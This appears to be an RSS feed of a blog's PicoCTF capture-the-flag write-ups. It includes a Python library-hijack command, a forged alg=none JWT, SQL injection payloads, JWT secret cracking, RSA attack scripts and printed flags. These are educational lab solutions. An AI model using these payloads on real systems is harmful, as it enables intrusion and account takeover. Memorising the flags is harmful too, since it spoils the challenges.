/usr/bin/python3 /home/picoctf/.server.py total 4 d--------- 1 root root 6 Mar 16 02:08 . drwxr-xr-x 1 root root 51 Jul 31 15:23 .. -rw-r--r-- 1 root root 103 Mar 16 02:08 metadata.json sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname $ vim /usr/lib/python3.8/base64.py # revise the file os.system('cat /challegne/metadata.json') $ sudo /usr/bin/python3 /home/picoctf/.server.py {"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}</description></item><item><title>PicoCTF - information</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/picoctf---information/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/picoctf---information/index.html</guid><description>PicoCTF - information tags: PicoCTF CTF Misc Challenge: https://play.picoctf.org/practice/challenge/186?category=4&amp;page=1
Background ExifTool
Exploit $ exiftool cat.jpg ExifTool Version Number : 11.88 File Name : cat.jpg Directory : . File Size : 858 kB File Modification Date/Time : 2023:02:16 02:15:29+08:00 File Access Date/Time : 2023:02:16 16:09:51+08:00 File Inode Change Date/Time : 2023:02:16 12:31:32+08:00 File Permissions : rwxrwxrwx File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617 Copyright Notice : PicoCTF Application Record Version : 4 XMP Toolkit : Image::ExifTool 10.80 License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 Rights : PicoCTF Image Width : 2560 Image Height : 1598 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 2560x1598 Megapixels : 4.1 In License row, it’s obviously a base64 encoding string picoCTF{the_m3tadata_1s_modified}</description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</guid><description>PicoCTF - Insp3ct0r tags: PicoCTF CTF Web Challenge: Insp3ct0r
Source code Exploit - Browser Inspector HTML
&lt;!doctype html> &lt;html> &lt;head> &lt;title>My First Website :)&lt;/title> &lt;link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet"> &lt;link rel="stylesheet" type="text/css" href="mycss.css"> &lt;script type="application/javascript" src="myjs.js">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;header> &lt;h1>Inspect Me&lt;/h1> &lt;/header> &lt;button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What&lt;/button> &lt;button class="tablink" onclick="openTab('tababout', this, '#222')">How&lt;/button> &lt;div id="tabintro" class="tabcontent"> &lt;h3>What&lt;/h3> &lt;p>I made a website&lt;/p> &lt;/div> &lt;div id="tababout" class="tabcontent"> &lt;h3>How&lt;/h3> &lt;p>I used these to make this site: &lt;br/> HTML &lt;br/> CSS &lt;br/> JS (JavaScript) &lt;/p> &lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --> &lt;/div> &lt;/div> &lt;/body> &lt;/html> CSS Download it and search specific string</description></item><item><title>PicoCTF - Investigative Reversing 0</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html</guid><description>PicoCTF - Investigative Reversing 0 tags: PicoCTF CTF Misc Challenge: Investigative Reversing 0
Background fputc() - C語言庫函數 C/C++ fread 用法與範例 C中fread()函数的返回值 C语言之1ULL/1UL/1L区别
Source code - IDA :::spoiler source code
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-4Ch] int j; // [rsp+8h] [rbp-48h] FILE *stream; // [rsp+10h] [rbp-40h] FILE *v8; // [rsp+18h] [rbp-38h] char ptr[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+48h] [rbp-8h] v10 = __readfsqword(40u); stream = fopen("flag.txt", "r"); v8 = fopen("mystery.png", "a"); if ( !stream ) puts("No flag found, please make sure this is run on the server"); if ( !v8 ) puts("mystery.png is missing, please run this on the server"); if ( (int)fread(ptr, 26uLL, 1uLL, stream) &lt;= 0 ) exit(0); puts("at insert"); fputc(ptr[0], v8); fputc(ptr[1], v8); fputc(ptr[2], v8); fputc(ptr[3], v8); fputc(ptr[4], v8); fputc(ptr[5], v8); for ( i = 6; i &lt;= 14; ++i ) fputc((char)(ptr[i] + 5), v8); fputc((char)(ptr[15] - 3), v8); for ( j = 16; j &lt;= 25; ++j ) fputc(ptr[j], v8); fclose(v8); fclose(stream); return __readfsqword(40u) ^ v10; } :::</description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</guid><description>PicoCTF - It is my Birthday tags: PicoCTF CTF Web Challenge: It is my Birthday
Background corkami/collisions
Exploit - MD5 Collision Try to find different pdf file that has same MD5 hash Such as the example provided by corkami - poeMD5_A and poeMD5_B Note that, you must notice the file size you uploaded can not too large.
Source code - After Exploit :::spoiler after exploit you can get the source code &amp; flag</description></item><item><title>PicoCTF - It's Not My Fault 1</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html</guid><description>PicoCTF - It’s Not My Fault 1 tags: PicoCTF CTF Crypto Background Source code :::spoiler Source code
#!/usr/bin/python3 -u import random import string import hashlib import time from Crypto.Util.number import inverse, getPrime, bytes_to_long, GCD from sympy.ntheory.modular import solve_congruence FLAG = open('flag.txt', 'r').read() def CRT(a, m, b, n): val, mod = solve_congruence((a, m), (b, n)) return val def gen_key(): while True: p = getPrime(512) q = getPrime(512) if GCD(p-1, q-1) == 2: return p, q def get_clue(p, q, BITS): while True: d_p = random.randint(1, 1 &lt;&lt; BITS) d_q = random.randint(1, q - 1) if d_p % 2 == d_q % 2: d = CRT(d_p, p - 1, d_q, q - 1) e = inverse(d, (p - 1) * (q - 1)) print("Clue : ", e) return def get_flag(p, q): start = time.time() ans = int(input()) if (time.time() - start) > (15 * 60): print("Too long!") exit() else: if ans == p + q: print(FLAG) else: print("oops...") #PoW vals1 = "".join([random.choice(string.digits) for _ in range(5)]) vals2 = "".join([random.choice(string.hexdigits.lower()) for _ in range(6)]) user_input = input("Enter a string that starts with \"{}\" (no quotes) which creates an md5 hash that ends in these six hex digits: {}\n".format(vals1, vals2)) user_hash = hashlib.md5(user_input.encode()).hexdigest() if user_input[:5] == vals1 and user_hash[-6:] == vals2: p, q = gen_key() n = p * q print("Public Modulus : ", n) get_clue(p, q, 20) get_flag(p, q) :::</description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</guid><description>PicoCTF - JAUTH Background NTUCNS - HW3 - JWT Authentication
Exploit - JWR + None 其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign
用類似jwt.io的網站(online tool)，但支援alg=none的編碼 Payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ Flag: picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
Reference picoCTF : JAUTH (Challenge 8)</description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</guid><description>PicoCTF - Java Code Analysis!?! Background JWT
Source code Too Much to list
Hint Maybe try to find the JWT Signing Key (“secret key”) in the source code? Maybe it’s hardcoded somewhere? Or maybe try to crack it? The ‘role’ and ‘userId’ fields in the JWT can be of interest to you! The ‘controllers’, ‘services’ and ‘security’ java packages in the given source code might need your attention. We’ve provided a README.md file that contains some documentation. Upgrade your ‘role’ with the new (cracked) JWT. And re-login for the new role to get reflected in browser’s localStorage. Recon 這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關</description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</guid><description>PicoCTF - Java Script Kiddie Background JavaScript Array slice()
const fruits = ["Banana", "Orange", "Lemon", "Apple", "Mango"]; const citrus = fruits.slice(1, 3); # output: Orange,Lemon JavaScript Uint8Array.from() Method
let array = Uint8Array.from('45465768654323456'); console.log(array); # output: Uint8Array(17) [ 4, 5, 4, 6, 5, 7, 6, 8, 6, 5, 4, 3, 2, 3, 4, 5, 6 ] JavaScript String.fromCharCode()
let text = String.fromCharCode(65); console.log(text) # output: A Source code :::spoiler Source Code
&lt;html> &lt;head> &lt;script src="jquery-3.3.1.min.js">&lt;/script> &lt;script> var bytes = []; $.get("bytes", function(resp) { bytes = Array.from(resp.split(" "), x => Number(x)); }); function assemble_png(u_in){ var LEN = 16; var key = "0000000000000000"; var shifter; if(u_in.length == LEN){ key = u_in; } var result = []; for(var i = 0; i &lt; LEN; i++){ shifter = key.charCodeAt(i) - 48; for(var j = 0; j &lt; (bytes.length / LEN); j ++){ result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i] } } while(result[result.length-1] == 0){ result = result.slice(0,result.length-1); } document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result))); return false; } &lt;/script> &lt;/head> &lt;body> &lt;center> &lt;form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)"> &lt;input type="text" id="user_in"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;img id="Area" src=""/> &lt;/center> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</guid><description>PicoCTF - JaWT Scratchpad Background NTUCNS - HW3 - JWT Authentication
Recon 這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示： 也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用John，看起來就是用john-the-ripper解出token password
Exploit - Brute Force Brute Force Password
$ cat jwt.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8% $ ./john.exe ../jwt.txt --wordlist=../rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ilovepico (?) 1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71 Use the "--show" option to display all of the cracked passwords reliably Session completed Token Password: ilovepico</description></item><item><title>PicoCTF - john_pollard</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html</guid><description>PicoCTF - john_pollard tags: PicoCTF CTF Crypto Background openssl - rsa
Source code -----BEGIN CERTIFICATE----- MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1 BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz q16/S1WLvzg4PsElmv1f -----END CERTIFICATE----- Recon Hint 1: The flag is in the format picoCTF{p,q} Hint 2: Try swapping p and q if it does not work 這一題就只是把certificate解出來，發現n超小，所以就直接 Exploit - openssl $ openssl openssl x509 -in cert -pubkey -noout > public.pem -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- $ openssl rsa -pubin -in public.pem -text RSA Public-Key: (53 bit) Modulus: 4966306421059967 (0x11a4d45212b17f) Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- Use online tool to factor p = 67867967 q = 73176001</description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</guid><description>PicoCTF - Kit Engine Background Google V8 Engine
V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。
Using d8
d8 is V8’s own developer shell.
d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the –help argument for more information about usage and flags.</description></item><item><title>PicoCTF - Let's get dynamic</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</guid><description>PicoCTF - Let’s get dynamic Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+1Ch] [rbp-114h] char s2[64]; // [rsp+20h] [rbp-110h] BYREF char s[64]; // [rsp+60h] [rbp-D0h] BYREF char v7[8]; // [rsp+A0h] [rbp-90h] BYREF __int64 v8; // [rsp+A8h] [rbp-88h] __int64 v9; // [rsp+B0h] [rbp-80h] __int64 v10; // [rsp+B8h] [rbp-78h] __int64 v11; // [rsp+C0h] [rbp-70h] __int64 v12; // [rsp+C8h] [rbp-68h] __int16 v13; // [rsp+D0h] [rbp-60h] __int64 v14[6]; // [rsp+E0h] [rbp-50h] __int16 v15; // [rsp+110h] [rbp-20h] unsigned __int64 v16; // [rsp+118h] [rbp-18h] v16 = __readfsqword(0x28u); *v7 = 0xFD872AC7CA737102LL; v8 = 0x4915F12BF9F82DCBLL; v9 = 0xA7EF0D4C54003C10LL; v10 = 0x9399CCF74D02A843LL; v11 = 0x2AC6F818989688D7LL; v12 = 0x9F51EBCA33584C85LL; v13 = 231; v14[0] = 0x92D46893B5010A61LL; v14[1] = 0xA6BDE59D58F4EB4LL; v14[2] = 0xFC993A3238355027LL; v14[3] = 0xEDA7B28D7054D179LL; v14[4] = 0x419FBB499BD4CFBBLL; v14[5] = 0x935AE3903F554688LL; v15 = 185; fgets(s, 49, _bss_start); for ( i = 0; i &lt; strlen(v7); ++i ) s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13; if ( !memcmp(s, s2, 49uLL) ) { puts("No, that's not right."); return 1; } else { puts("Correct! You entered the flag."); return 0; } } :::</description></item><item><title>PicoCTF - like1000</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---like1000/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---like1000/index.html</guid><description>PicoCTF - like1000 tags: PicoCTF CTF Misc Challenge: like1000
Background How to extract nested tar.gz files easily? Shell Script - While
Exploit - Untar 1000 times For untar folders #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=1000 for next in ${file_name}.tar while [ $file_name > 1 ] do echo "Untaring - $file_name" tar -xvf ${file_name}.tar #-C ./ file_name=$(($file_name-1)) mkdir ./$file_name mv ${file_name}.tar ./$file_name cd ./${file_name} done For getting flag #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=999 while [ "$file_name" > "0" ] do cd ./${file_name} file_name=$(($file_name-1)) if [ "$file_name" == "0" ] then ls -al cat filler.txt mv flag.png ~/CTF/PicoCTF/Misc/like1000 fi done exit 0 Reference Shell Script 變數相加 How to solve gzip: stdin: not in gzip format error 解压缩报错tar: Error is not recoverable: exiting now In a bash script, using the conditional “or” in an “if” statement</description></item><item><title>PicoCTF - m00nwalk</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html</guid><description>PicoCTF - m00nwalk tags: PicoCTF CTF Misc Challenge: m00nwalk
Description &amp; Hint Decode this message from the moon. Hint:
How did pictures from the moon landing get sent back to Earth? What is the CMU mascot?, that might help select a RX option Background 慢掃描電視 - slow-scan television(sstv)
Source code Exploit - qsstv + First, I thought it might be a mp3stego problem but found nothing. So, I tried to find the write up about this question. Use QSSTV $ sudo apt-get install pavucontrol $ sudo apt-get install qsstv $ pactl load-module module-null-sink sink_name=virtual-cable 22 The Setting pavucontrol</description></item><item><title>PicoCTF - m00nwalk2</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html</guid><description>PicoCTF - m00nwalk2 tags: PicoCTF CTF Misc Challenge: m00nwalk2
Description &amp; Hint Revisit the last transmission. We think this transmission contains a hidden message. There are also some clues clue 1, clue 2, clue 3.
Hint:
Use the clues to extract the another flag from the .wav file Background m00nwalk
Exploit - QSSTV Follow the write up of m00nwalk then you’ll get 3 images from 3 clues respectively.</description></item><item><title>PicoCTF - MacroHard WeakEdge</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html</guid><description>PicoCTF - MacroHard WeakEdge tags: PicoCTF CTF Misc Challenge: MacroHard WeakEdge
Background What is a PPTM file? It’s a zip format file
A PPTM file is a macro-enabled presentation created by Microsoft PowerPoint, an application used to create presentations and slide shows. It contains a collection of slides, which typically includes text, layout, images, and embedded macros. PPTM files are commonly used to store business, marketing, and academic presentations.</description></item><item><title>PicoCTF - Matryoshka doll</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html</guid><description>PicoCTF - Matryoshka doll tags: PicoCTF CTF Misc Challenge: Exploit - rar in rar Hint The hint said:
Wait, you can hide files inside files? But how do you find them?
So…I tried stegsolve, HxD, exiftool, string dolls.jpg | grep "{", $ zsteg dolls.jpg … All these are in vain
通靈: Changed the extension to .rar And it can be uncompressed</description></item><item><title>PicoCTF - Mind your Ps and Qs</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html</guid><description>PicoCTF - Mind your Ps and Qs tags: PicoCTF CTF Crypto Challenge: Mind your Ps and Qs
Background RSA (觀念篇) Source code Decrypt my super sick RSA: c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637 e: 65537 Exploit - Find P &amp; Q By Online Tool Find P &amp; Q Use online tool to do prime factorize on n p $\to$ 1461849912200000206276283741896701133693 q $\to$ 431899300006243611356963607089521499045809
Write exploit
e = 65537 M = 631371953793368771804570727896887140714061729769155038068711341335911329840163136 k = 1 # p = 1461849912200000206276283741896701133693 # q = 431899300006243611356963607089521499045809 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x-(b//a)*y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % m while(True): if (1 + k * M) % e == 0: print('k = ', k, ' and d = ', (1 + k * M) / e) break else: k += 1 d = modinv(e, M) c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637 plain = pow(c, d, n) print(plain) print(hex(plain)) print(bytearray.fromhex(hex(plain)[2:])) Reference picoCTF 2021 Mind your Ps and Qs</description></item><item><title>PicoCTF - Mini RSA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html</guid><description>PicoCTF - Mini RSA tags: PicoCTF CTF Crypto Challenge: Mini RSA
Source code N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e: 3 ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 Exploit - Small e attack import gmpy2 from Crypto.Util.number import long_to_bytes N = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e = 3 c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 k = 1 while True: if gmpy2.iroot(c + N * k, 3)[1]==1: res=gmpy2.iroot(c + N * k, 3)[0] print(k, res) print(long_to_bytes(res)) break k += 1 Reference CTF_RSA解密学习指南(三) - e=3 小明文攻击</description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</guid><description>PicoCTF - More SQLi Background Feifei Lab Hint SQLiLite Recon 先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了 Account: Any Password: ' or '1'='1' -- # Exploit - SQLi(Union Selection) 現在的目標是flag應該是藏在別的table，所以先找甚麼table
找table 透過Kaibro的cheat sheet，SQLite的爆破payload是SELECT name FROM sqlite_master WHERE type='table'，而目前我們可以用union based的方式搜尋，先觀察搜尋Algiers的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守查詢數量一樣、每個欄位的型態一樣 Payload: Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; -- :::spoiler Screenshot :::</description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</guid><description>PicoCTF - Most Cookies tags: PicoCTF CTF Web Background Python Flask session 學習心得
在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。
Source code :::spoiler Source Code
